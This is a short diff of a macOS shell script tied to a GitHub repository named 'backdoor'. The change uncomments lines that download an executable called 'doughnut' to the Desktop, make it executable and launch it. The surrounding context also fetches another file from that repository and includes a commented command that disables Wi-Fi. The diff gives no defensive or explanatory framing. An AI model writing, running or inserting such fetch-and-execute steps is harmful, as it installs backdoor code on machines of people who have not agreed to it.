@@ -3,10 +3,10 @@ curl -O "https://raw.githubusercontent.com/Wolfoverflow/backdoor/main/com.wolfov
 cd ..
 # echo "success" >> .bombmaterials
 cd ..
-# cd ~/Desktop
-# curl -O "https://raw.githubusercontent.com/Wolfoverflow/backdoor/main/doughnut"
-# chmod +x doughnut
-# open doughnut
+cd ~/Desktop
+curl -O "https://raw.githubusercontent.com/Wolfoverflow/backdoor/main/doughnut"
+chmod +x doughnut
+open doughnut
 sleep 260
 # networksetup -setnetworkserviceenabled "Wi-Fi" off
 sleep 40
